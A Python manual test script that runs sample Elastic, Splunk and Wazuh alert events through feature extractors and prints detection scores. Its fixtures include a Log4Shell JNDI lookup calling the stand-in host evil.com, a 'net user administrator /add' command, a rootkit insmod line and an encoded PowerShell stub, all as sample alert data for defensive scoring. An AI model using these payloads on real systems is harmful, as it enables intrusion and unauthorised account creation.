"""
Manual test for Elastic, Splunk and Wazuh extractors.
Run: python test_siems_manual.py
"""
import sys
sys.path.insert(0, ".")
from dfs_core.features.elastic_siem import extract as elastic
from dfs_core.features.splunk_notable import extract as splunk
from dfs_core.features.wazuh_alert import extract as wazuh

# ── ELASTIC CASES ────────────────────────────────────────────────────────────
ELASTIC_CASES = {
    "EQL: Malware via Office (critical, full)": {
        "kibana.alert.rule.name": "Malware - Office Child Process",
        "kibana.alert.rule.type": "eql",
        "kibana.alert.severity": "critical",
        "kibana.alert.risk_score": 99,
        "kibana.alert.uuid": "alert-001",
        "kibana.alert.workflow_status": "open",
        "kibana.alert.ancestors": [{"id": "evt1"}, {"id": "evt2"}],
        "host": {"name": "WS-0231", "os": {"type": "windows"}, "id": "host-001"},
        "user": {"name": "jdoe", "domain": "CORP"},
        "process": {
            "name": "powershell.exe",
            "executable": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "command_line": "powershell -enc SQBFAF...",
            "parent": {"name": "WINWORD.EXE", "executable": r"C:\Office\WINWORD.EXE"},
        },
        "agent": {"id": "agent-001"},
        "threat": [{"tactic": {"name": "Execution"}, "technique": [{"id": "T1059.001"}]}],
    },

    "TI Match: Known C2 IP (indicator_match)": {
        "kibana.alert.rule.name": "Threat Intel - C2 IP Match",
        "kibana.alert.rule.type": "indicator_match",
        "kibana.alert.severity": "high",
        "kibana.alert.risk_score": 85,
        "kibana.alert.uuid": "alert-002",
        "kibana.alert.workflow_status": "open",
        "host": {"name": "DC-01", "os": {"type": "windows"}, "id": "host-002"},
        "user": {"name": "SYSTEM"},
        "destination": {"ip": "185.220.101.42", "port": 4444},
        "source": {"ip": "10.0.1.5"},
        "agent": {"id": "agent-002"},
        "threat": [{"tactic": {"name": "Command and Control"}, "technique": [{"id": "T1071"}]}],
    },

    "ML: Anomalous process (medium, no process ctx)": {
        "kibana.alert.rule.name": "ML - Unusual Process Activity",
        "kibana.alert.rule.type": "machine_learning",
        "kibana.alert.severity": "medium",
        "kibana.alert.risk_score": 55,
        "kibana.alert.uuid": "alert-003",
        "record_score": 72,
        "host": {"name": "SRV-DB-01", "os": {"type": "linux"}},
        "user": {"name": "postgres"},
        "agent": {"id": "agent-003"},
        "threat": [],
    },

    "Building block (supporting alert, not standalone)": {
        "kibana.alert.rule.name": "RBA - Suspicious Login",
        "kibana.alert.rule.type": "query",
        "kibana.alert.severity": "low",
        "kibana.alert.risk_score": 21,
        "kibana.alert.building_block_type": "default",
        "kibana.alert.uuid": "alert-004",
        "host": {"name": "WS-0881"},
        "user": {"name": "bob"},
    },
}

# ── SPLUNK CASES ─────────────────────────────────────────────────────────────
SPLUNK_CASES = {
    "RBA: High risk user (score 95, multi-event)": {
        "rule_name": "Access - Brute Force in 30 Minutes",
        "urgency": "critical",
        "severity": "high",
        "risk_score": 95,
        "risk_object": "jdoe@corp.com",
        "risk_object_type": "user",
        "contributing_events_count": 47,
        "event_id": "notable-001",
        "status": "new",
        "src": "198.51.100.42",
        "dest": "DC-01",
        "user": "jdoe@corp.com",
        "dvc": "DC-01",
        "process": "cmd.exe",
        "process_path": r"C:\Windows\System32\cmd.exe",
        "cmdline": "cmd.exe /c net user administrator /add",
        "parent_process": "powershell.exe",
        "mitre_technique_id": "T1110",
        "mitre_tactic": "Credential Access",
        "orig_sourcetype": "WinEventLog:Security",
    },

    "Notable: Web attack (SQL injection)": {
        "rule_name": "Web - SQL Injection Attack",
        "urgency": "high",
        "severity": "high",
        "risk_score": 72,
        "event_id": "notable-002",
        "status": "new",
        "src": "203.0.113.10",
        "dest": "web-srv-01",
        "dest_port": "443",
        "user": "anonymous",
        "dvc": "web-srv-01",
        "orig_sourcetype": "access_combined",
        "mitre_technique_id": "T1190",
        "mitre_tactic": "Initial Access",
    },

    "Already closed notable": {
        "rule_name": "Access - Default Account Activity",
        "urgency": "medium",
        "severity": "medium",
        "risk_score": 45,
        "event_id": "notable-003",
        "status": "closed",
        "src": "10.0.1.10",
        "dest": "SRV-01",
        "user": "admin",
        "dvc": "SRV-01",
        "orig_sourcetype": "WinEventLog:System",
    },
}

# ── WAZUH CASES ──────────────────────────────────────────────────────────────
WAZUH_CASES = {
    "Level 15: Rootkit detected (critical)": {
        "_source": {
            "rule": {
                "id": "510", "level": 15,
                "description": "Host-based anomaly detection event (rootkit).",
                "groups": ["rootkit", "attack"],
                "mitre": {"id": ["T1014"], "tactic": ["Defense Evasion"], "technique": ["Rootkit"]},
                "firedtimes": 1,
            },
            "agent": {"id": "001", "name": "WS-0231", "ip": "10.0.1.55"},
            "manager": {"name": "wazuh-manager"},
            "timestamp": "2024-01-15T10:30:00Z",
            "data": {"srcip": "10.0.1.55", "command": "insmod rootkit.ko"},
        }
    },

    "Level 10: Brute force SSH (medium-high, high freq)": {
        "_source": {
            "rule": {
                "id": "5712", "level": 10,
                "description": "SSHD brute force trying to get access to the system.",
                "groups": ["authentication_failures", "brute_force", "pci_dss_10"],
                "firedtimes": 35,
            },
            "agent": {"id": "002", "name": "linux-srv-01", "ip": "10.0.2.10"},
            "manager": {"name": "wazuh-manager"},
            "timestamp": "2024-01-15T10:31:00Z",
            "data": {"srcip": "198.51.100.42", "srcuser": "root", "dstport": "22"},
        }
    },

    "FIM: /etc/passwd modified (critical path)": {
        "_source": {
            "rule": {
                "id": "550", "level": 7,
                "description": "Integrity checksum changed.",
                "groups": ["syscheck", "ossec"],
                "mitre": {"id": ["T1098"], "tactic": ["Persistence"]},
                "firedtimes": 1,
            },
            "agent": {"id": "003", "name": "prod-srv-02", "ip": "10.0.3.5"},
            "manager": {"name": "wazuh-manager"},
            "timestamp": "2024-01-15T10:32:00Z",
            "syscheck": {
                "path": "/etc/passwd",
                "event": "modified",
                "uname_after": "root",
            },
            "data": {},
        }
    },

    "CVE-2021-44228 Log4Shell (CVSS 10.0)": {
        "_source": {
            "rule": {
                "id": "99001", "level": 12,
                "description": "CVE-2021-44228 Log4Shell exploitation attempt",
                "groups": ["exploit", "web_attack", "attack"],
                "mitre": {"id": ["T1190"], "tactic": ["Initial Access"]},
                "firedtimes": 3,
            },
            "agent": {"id": "004", "name": "java-app-01", "ip": "10.0.4.20"},
            "manager": {"name": "wazuh-manager"},
            "timestamp": "2024-01-15T10:33:00Z",
            "vulnerability": {
                "cve": "CVE-2021-44228",
                "severity": "critical",
                "cvss": {"cvss3": {"base_score": 10.0}},
            },
            "data": {"srcip": "203.0.113.99", "url": "/${jndi:ldap://evil.com/a}"},
        }
    },
}

def print_table(cases, extractor, title):
    print(f"\n{'='*76}")
    print(f"  {title}")
    print(f"{'='*76}")
    print(f"{'CASE':<44} {'S':>6} {'T':>6} {'B':>6} {'DFS':>7}")
    print(f"{'-'*76}")
    for name, event in cases.items():
        inputs, flags = extractor(event)
        dfs = round(inputs.signal * inputs.trust * inputs.overlap, 4)
        print(f"{name:<44} {inputs.signal:>6.3f} {inputs.trust:>6.3f} {inputs.overlap:>6.3f} {dfs:>7.4f}")
        risk = [k for k, v in flags.items() if v is True and k.startswith("is_")]
        if risk:
            print(f"  flags: {', '.join(risk[:5])}")
    print(f"{'='*76}")

print_table(ELASTIC_CASES, elastic, "ELASTIC SIEM")
print_table(SPLUNK_CASES, splunk, "SPLUNK ENTERPRISE SECURITY")
print_table(WAZUH_CASES, wazuh, "WAZUH XDR")
print()
